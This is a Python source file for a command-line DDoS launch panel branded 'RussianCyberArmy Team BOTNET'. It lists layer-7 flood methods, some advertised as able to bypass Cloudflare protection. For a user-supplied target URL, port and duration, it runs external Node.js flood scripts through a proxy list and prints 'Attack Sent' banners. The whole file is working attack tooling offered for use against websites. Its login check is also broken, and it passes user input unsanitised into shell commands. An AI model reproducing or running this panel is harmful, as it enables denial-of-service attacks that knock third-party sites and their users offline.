import socket
import os
import requests
import random
import getpass
import time
import sys
from pystyle import Colors, Colorate

username = "Julia"
Role = "Admin"

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def si():
    print(Colorate.Diagonal(Colors.yellow_to_red, f"𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 RussianCyberArmy Team 𝐃𝐃𝐨𝐒 𝐏𝐚𝐧𝐞𝐥 | 𝐔𝐬𝐞𝐫: {username} | 𝐑𝐨𝐥𝐞: {Role} | 𝐇𝐚𝐩𝐩𝐲 𝐓𝐨 𝐔𝐬𝐞"))
    print("")
  
def Methods():
    clear()
    si()
    print(Colorate.Diagonal(Colors.yellow_to_red, ''' 
            𝐇𝐞𝐫𝐞 𝐢𝐬 𝐭𝐡𝐞 𝐋𝐢𝐬𝐭 𝐨𝐟 𝐀𝐥𝐥 𝐌𝐞𝐭𝐡𝐨𝐝𝐬
            

-𝐓𝐋𝐒 - 𝐒𝐞𝐧𝐝 𝐍𝐨𝐫𝐦𝐚𝐥 𝐓𝐋𝐒 𝐃𝐃𝐨𝐒 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐨 𝐖𝐞𝐛𝐬𝐢𝐭𝐞 [𝐕𝐕𝐈𝐏]🔥
-𝐓𝐋𝐒𝐕𝐈𝐏 - 𝐁𝐞𝐬𝐭 𝐌𝐞𝐭𝐡𝐨𝐝 𝐂𝐚𝐧 𝐁𝐲𝐩𝐚𝐬𝐬 𝐔𝐀𝐌 [𝐕𝐕𝐈𝐏]🔥 
-𝐓𝐋𝐒𝐔𝐀 - 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐚𝐫𝐠𝐞𝐭 𝐔𝐬𝐢𝐧𝐠 𝐆𝐨𝐨𝐝 𝐔𝐀 (𝐔𝐬𝐞𝐫𝐀𝐠𝐞𝐧𝐭) (𝐍𝐨𝐫𝐦𝐚𝐥)🚀 
-𝐇𝐓𝐓𝐏𝐒𝐕𝟑 - 𝐒𝐞𝐧𝐝 𝐇𝐢𝐠𝐡 𝐑𝐏𝐒 𝐖𝐢𝐭𝐡 𝐬𝐦𝐚𝐥𝐥 𝐓𝐡𝐫𝐞𝐚𝐝𝐬 [𝐁𝐀𝐒𝐈𝐂]🐉 
-𝐁𝐋𝐀𝐂𝐊-𝐂𝐇𝐈𝐏 - 𝐒𝐞𝐧𝐝 𝐃𝐃𝐨𝐒 𝐀𝐭𝐭𝐚𝐜𝐤 𝐖𝐢𝐭𝐡 𝐇𝐢𝐠𝐡 𝐑𝐩𝐬 𝐀𝐧𝐝 𝐁𝐢𝐠 𝐓𝐡𝐫𝐞𝐚𝐝𝐬 [𝐕𝐈𝐏]🔥 
-𝐓𝐋𝐒𝐕𝟑 - 𝐏𝐨𝐰𝐞𝐫𝐟𝐮𝐥𝐥 𝐋𝐚𝐲𝐞𝐫𝟕 𝐌𝐞𝐭𝐡𝐨𝐝𝐬 𝐂𝐚𝐧 𝐁𝐲𝐩𝐚𝐬𝐬 𝐔𝐀𝐌
-𝐅𝐋𝐎𝐎𝐃 - 𝐇𝐓𝐓𝐏/𝟐 𝐅𝐋𝐎𝐎𝐃𝐄𝐑
-𝐅𝐋𝐎𝐎𝐃𝐕𝟐 - 𝐇𝐓𝐓𝐏/𝟐 𝐅𝐋𝐎𝐎𝐃𝐄𝐑 𝐖𝐈𝐓𝐇 𝐂𝐅-𝐁𝐘𝐏𝐀𝐒𝐒

HOW TO USE
TLS https://example.com 443 120         METHOD PORT TIME
'''))

def menu():
    clear()
    print(Colorate.Diagonal(Colors.yellow_to_red, f"𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 RussianCyberArmy Team 𝐃𝐃𝐨𝐒 𝐏𝐚𝐧𝐞𝐥 | 𝐔𝐬𝐞𝐫: {username} | 𝐑𝐨𝐥𝐞: {Role} | 𝐇𝐚𝐩𝐩𝐲 𝐓𝐨 𝐔𝐬𝐞"))
    print("")
    banner = '''
        ⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣤⣤⡼⠀⢀⡀⣀⢱⡄⡀⠀⠀⠀⢲⣤⣤⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⡿⠛⠋⠁⣤⣿⣿⣿⣧⣷⠀⠀⠘⠉⠛⢻⣷⣿⣽⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣞⣽⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠠⣿⣿⡟⢻⣿⣿⣇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣟⢦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣿⡾⣿⣿⣿⣿⣿⠿⣻⣿⣿⡀⠀⠀⠀⢻⣿⣷⡀⠻⣧⣿⠆⠀⠀⠀⠀⣿⣿⣿⡻⣿⣿⣿⣿⣿⠿⣽⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠟⣩⣾⣿⣿⣿⢟⣵⣾⣿⣿⣿⣧⠀⠀⠀⠈⠿⣿⣿⣷⣈⠁⠀⠀⠀⠀⣰⣿⣿⣿⣿⣮⣟⢯⣿⣿⣷⣬⡻⣷⡄⠀⠀⠀
⠀⠀⢀⡜⣡⣾⣿⢿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⣄⠀⣰⣿⣿⣿⣿⣿⣷⣄⠀⢀⣼⣿⣿⣿⣷⡹⣿⣿⣿⣿⣿⣿⢿⣿⣮⡳⡄⠀⠀
⠀⢠⢟⣿⡿⠋⣠⣾⢿⣿⣿⠟⢃⣾⢟⣿⢿⣿⣿⣿⣾⡿⠟⠻⣿⣻⣿⣏⠻⣿⣾⣿⣿⣿⣿⡛⣿⡌⠻⣿⣿⡿⣿⣦⡙⢿⣿⡝⣆⠀
⠀⢯⣿⠏⣠⠞⠋⠀⣠⡿⠋⢀⣿⠁⢸⡏⣿⠿⣿⣿⠃⢠⣴⣾⣿⣿⣿⡟⠀⠘⢹⣿⠟⣿⣾⣷⠈⣿⡄⠘⢿⣦⠀⠈⠻⣆⠙⣿⣜⠆
⢀⣿⠃⡴⠃⢀⡠⠞⠋⠀⠀⠼⠋⠀⠸⡇⠻⠀⠈⠃⠀⣧⢋⣼⣿⣿⣿⣷⣆⠀⠈⠁⠀⠟⠁⡟⠀⠈⠻⠀⠀⠉⠳⢦⡀⠈⢣⠈⢿⡄
⣸⠇⢠⣷⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠿⠋⠀⢻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢾⣆⠈⣷
⡟⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣤⡀⢸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡄⢹
⡇⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⣿⣼⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠃⢸
⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠶⣶⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼
⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣼⣀⣠⠂⠀⠀⠀
                   | RussianCyberArmy Team BOTNET |⠀⠀⠀⠀
                   | @CyberArmyOfRussia_Reborn | @ru22C


Type Methods Yo See All Method⠀⠀⠀⠀⠀  
'''
    print(Colorate.Diagonal(Colors.yellow_to_red, banner))
def main():
    menu()
    while(True):
        cnc = input(Colorate.Diagonal(Colors.yellow_to_red, f"{username}@RCAT#~"))
        if cnc == "Methods" or cnc == "Method" or cnc == "methods" or cnc == "l7":
            Methods()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            clear()

      
                
        elif "TLSV1" in cnc:
            try: 
                host = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                print(Colorate.Diagonal(Colors.yellow_to_red, f'''
                ╔═══════════════════════════════════════════════╗
                                           Attack Sent

                          Target: [ {host} ]
                          Time: [ {time} ]
                          Port: [ {port}
                          Method: [ TLSv1 ]
                          Attack By User: [ {username} ]
                          Role: [ {Role} ]
                          
                ╚═══════════════════════════════════════════════╝
                '''))
                os.system(f'node tlsv1.js {host} {time} 64 1000 proxy.txt')
            except IndexError:
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Usage: METHOD URL PORT TIME'));
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Example: METHOD URL PORT TIME'));
                
        elif "TLSV3" in cnc:
            try: 
                host = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                print(Colorate.Diagonal(Colors.yellow_to_red, f'''
                ╔═══════════════════════════════════════════════╗
                                           Attack Sent

                          Target: [ {host} ]
                          Time: [ {time} ]
                          Port: [ {port}
                          Method: [ TLSv3 ]
                          Attack By User: [ {username} ]
                          Role: [ {Role} ]
                          
                ╚═══════════════════════════════════════════════╝
                '''))
                os.system(f'node tlsv3.js {host} {time} 64 1000 proxy.txt')
            except IndexError:
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Usage: METHOD URL PORT TIME'));
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Example: METHOD URL PORT TIME'));             
                
        elif "TLSUA" in cnc:
            try: 
                host = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                print(Colorate.Diagonal(Colors.yellow_to_red, f'''
                ╔═══════════════════════════════════════════════╗
                                           Attack Sent

                          Target: [ {host} ]
                          Time: [ {time} ]
                          Port: [ {port}
                          Method: [ TLSUA ]
                          Attack By User: [ {username} ]
                          Role: [ {Role} ]
                          
                ╚═══════════════════════════════════════════════╝
                '''))
                os.system(f'node tlsua.js {host} {time} 64 1000 proxy.txt')
            except IndexError:
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Usage: METHOD URL PORT TIME'));
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Example: METHOD URL PORT TIME'));
                
        elif "TLSVIP" in cnc:
            try: 
                host = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                print(Colorate.Diagonal(Colors.yellow_to_red, f'''
                ╔═══════════════════════════════════════════════╗
                                           Attack Sent

                          Target: [ {host} ]
                          Time: [ {time} ]
                          Port: [ {port}
                          Method: [ TLSVIP ]
                          Attack By User: [ {username} ]
                          Role: [ {Role} ]
                          
                ╚═══════════════════════════════════════════════╝
                '''))
                os.system(f'node tlsvip.js {host} {time} 64 1000 proxy.txt')
            except IndexError:
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Usage: METHOD URL PORT TIME'));
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Example: METHOD URL PORT TIME'));
                
        elif "BYPASS" in cnc:
            try: 
                host = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                print(Colorate.Diagonal(Colors.yellow_to_red, f'''
                ╔═══════════════════════════════════════════════╗
                                           Attack Sent

                          Target: [ {host} ]
                          Time: [ {time} ]
                          Port: [ {port}
                          Method: [ BYPASS ]
                          Attack By User: [ {username} ]
                          Role: [ {Role} ]
                          
                ╚═══════════════════════════════════════════════╝
                '''))
                os.system(f'node bypass.js {host} {time} 64 1000 proxy.txt')
            except IndexError:
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Usage: METHOD URL PORT TIME'));
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Example: METHOD URL PORT TIME'));
                
        elif "HTTPSV3" in cnc:
            try: 
                host = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                print(Colorate.Diagonal(Colors.yellow_to_red, f'''
                ╔═══════════════════════════════════════════════╗
                                           Attack Sent

                          Target: [ {host} ]
                          Time: [ {time} ]
                          Port: [ {port}
                          Method: [ HTTPSV3 ]
                          Attack By User: [ {username} ]
                          Role: [ {Role} ]
                          
                ╚═══════════════════════════════════════════════╝
                '''))
                os.system(f'node httpsv3 {host} {time} 64 1000 proxy.txt')
            except IndexError:
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Usage: METHOD URL PORT TIME'));
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Example: METHOD URL PORT TIME'));
                
        elif "BLACK-CHIP" in cnc:
            try: 
                host = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                print(Colorate.Diagonal(Colors.yellow_to_red, f'''
                ╔═══════════════════════════════════════════════╗
                                           Attack Sent

                          Target: [ {host} ]
                          Time: [ {time} ]
                          Port: [ {port}
                          Method: [ BLACK-CHIP ]
                          Attack By User: [ {username} ]
                          Role: [ {Role} ]
                          
                ╚═══════════════════════════════════════════════╝
                '''))
                os.system(f'node black-chip {host} {time} 64 1000 proxy.txt')
            except IndexError:
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Usage: METHOD URL PORT TIME'));
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Example: METHOD URL PORT TIME'));
                
        elif "FLOOD" in cnc:
            try: 
                host = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                print(Colorate.Diagonal(Colors.yellow_to_red, f'''
                ╔═══════════════════════════════════════════════╗
                                           Attack Sent

                          Target: [ {host} ]
                          Time: [ {time} ]
                          Port: [ {port}
                          Method: [ FLOOD ]
                          Attack By User: [ {username} ]
                          Role: [ {Role} ]
                          
                ╚═══════════════════════════════════════════════╝
                '''))
                os.system(f'node flood {host} {time} 64 1000 proxy.txt')
            except IndexError:
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Usage: METHOD URL PORT TIME'));
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Example: METHOD URL PORT TIME'));
                
        elif "FLOODV2" in cnc:
            try: 
                host = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                print(Colorate.Diagonal(Colors.yellow_to_red, f'''
                ╔═══════════════════════════════════════════════╗
                                           Attack Sent

                          Target: [ {host} ]
                          Time: [ {time} ]
                          Port: [ {port}
                          Method: [ FLOODV2 ]
                          Attack By User: [ {username} ]
                          Role: [ {Role} ]
                          
                ╚═══════════════════════════════════════════════╝
                '''))
                os.system(f'node floodv2 {host} {time} 64 1000 proxy.txt')
            except IndexError:
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Usage: METHOD URL PORT TIME'));
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Example: METHOD URL PORT TIME'));


        elif "QWE" in cnc:
            try: 
                host = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                print(Colorate.Diagonal(Colors.yellow_to_red, f'''
                ╔═══════════════════════════════════════════════╗
                                           Attack Sent

                          Target: [ {host} ]
                          Time: [ {time} ]
                          Port: [ {port}
                          Method: [ QWE ]
                          Attack By User: [ {username} ]
                          Role: [ {Role} ]
                          
                ╚═══════════════════════════════════════════════╝
                '''))
                os.system(f'node qwe.js {host} {time} 64 1000 proxy.txt')
            except IndexError:
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Usage: METHOD URL PORT TIME'));
                print(Colorate.Diagonal(Colors.yellow_to_red, 'Example: METHOD URL PORT TIME'));


        elif "help" in cnc:
            print(Colorate.Diagonal(Colors.yellow_to_red, ''' 
𝐋𝐀𝐘𝐄𝐑𝟕 - 𝐒𝐄𝐄 𝐀𝐋𝐋 𝐋𝐀𝐘𝐄𝐑𝟕 𝐌𝐄𝐓𝐇𝐎𝐃 
𝐇𝐄𝐋𝐏 - 𝐅𝐎𝐑 𝐇𝐄𝐋𝐏 
𝐂𝐋𝐄𝐀𝐑 - 𝐂𝐋𝐄𝐀𝐑 𝐓𝐄𝐑𝐌𝐈𝐍𝐀𝐋
'''))
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    username = input("</> Username: ")
    password = getpass.getpass(prompt='</> Password: ')
    if username != username or password != username:
        print("")
        print("Password/Username KillMilk")        
        sys.exit(1)
    elif username == username and password == username:
        print("Welcome To RussianCyberArmy Team DDoS Panel")
        time.sleep(0.3)
        main()
login()
